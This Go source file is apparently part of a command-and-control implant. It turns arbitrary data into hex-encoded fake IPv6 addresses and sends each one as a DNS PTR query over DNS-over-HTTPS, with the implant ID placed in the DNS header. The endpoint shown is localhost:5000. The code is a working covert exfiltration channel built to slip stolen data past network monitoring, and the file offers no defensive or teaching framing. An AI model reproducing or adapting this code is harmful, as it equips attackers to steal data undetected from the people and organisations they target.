package shared

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
)

// stringToIPv6List converts a string to a list of IPv6 addresses.
func stringToIPv6List(input string) []string {
	// Convert the input string to its hexadecimal representation
	hexStr := hex.EncodeToString([]byte(input))

	// Pad the hex string to make its length a multiple of 32 characters (16 bytes)
	if len(hexStr)%32 != 0 {
		padding := 32 - len(hexStr)%32
		hexStr += strings.Repeat("0", padding)
	}

	// Split the hex string into 32-character chunks, each forming an IPv6 address
	var ipv6Addresses []string
	for i := 0; i < len(hexStr); i += 32 {
		chunk := hexStr[i : i+32]

		// Format the chunk into an IPv6 address with 8 groups of 4 hex digits
		ipv6 := fmt.Sprintf("%s:%s:%s:%s:%s:%s:%s:%s",
			chunk[0:4], chunk[4:8], chunk[8:12], chunk[12:16],
			chunk[16:20], chunk[20:24], chunk[24:28], chunk[28:32])

		ipv6Addresses = append(ipv6Addresses, ipv6)
	}

	return ipv6Addresses
}

// SendPTRRequest sends a PTR request to the target server
// Takes in an IP and ID
// The IP is the encoded data and the ID should be the implant ID hex encoded
// SendPTRRequest sends a DNS PTR request for a list of IPv6 addresses over HTTPS.
func SendPTRRequest(impId string, ipv6List []string) bool {
	num, err := strconv.Atoi(impId)
	if err != nil {
		return false
	}
	id := uint16(num)
	// Iterate over each IPv6 address and send a DNS PTR request
	for _, ipv6 := range ipv6List {
		var dnsPacket bytes.Buffer

		// Header
		header := struct {
			ID      uint16
			Flags   uint16
			QDCount uint16
			ANCount uint16
			NSCount uint16
			ARCount uint16
		}{
			ID:      id,     // The ID that the implant is assigned
			Flags:   0x0100, // Standard recursive query
			QDCount: 1,      // 1 question
		}
		binary.Write(&dnsPacket, binary.BigEndian, header)

		// Encode the IPv6 address in reverse DNS format
		ptrDomain := Ipv6ToPTR(ipv6)
		labels := strings.Split(ptrDomain, ".")
		for _, label := range labels {
			dnsPacket.WriteByte(byte(len(label)))
			dnsPacket.WriteString(label)
		}
		dnsPacket.WriteByte(0) // End of domain name

		// Type and Class
		question := struct {
			Type  uint16
			Class uint16
		}{
			Type:  12, // PTR
			Class: 1,  // IN
		}
		binary.Write(&dnsPacket, binary.BigEndian, question)

		// Send the packet over HTTPS
		client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{}}}
		req, err := http.NewRequest("POST", "http://localhost:5000/dns-query", &dnsPacket)
		if err != nil {
			fmt.Println("Error creating request:", err)
			return false
		}
		req.Header.Set("Content-Type", "application/dns-message")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error making DoH request:", err)
			return false
		}
		defer resp.Body.Close()

		// Read and display the response
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response:", err)
			return false
		}
		fmt.Printf("Raw DoH Response for %s: %x\n", ipv6, body)
	}
	return true
}
